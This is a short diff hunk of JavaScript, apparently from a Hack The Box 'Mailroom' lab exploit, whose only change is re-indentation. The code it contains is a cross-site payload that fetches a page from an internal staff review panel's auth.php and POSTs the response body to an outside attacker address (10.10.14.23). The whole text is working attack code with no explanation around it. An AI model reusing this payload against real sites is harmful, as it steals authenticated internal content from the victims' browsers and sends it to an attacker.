@@ -94,11 +94,11 @@ fetch('http://staff-review-panel.mailroom.htb/auth.php', {
 	.then(response => response.text())
 	.then(data => {
 	// Make a POST request to another website with the data
-	fetch('http://10.10.14.23/post', {
-		method: 'POST',
-		headers: {
-			'Content-Type': 'text/plain'
-		},
+		fetch('http://10.10.14.23/post', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'text/plain'
+			},
 			body: data
 		})
 			.then(response => console.log('Data sent:', response));
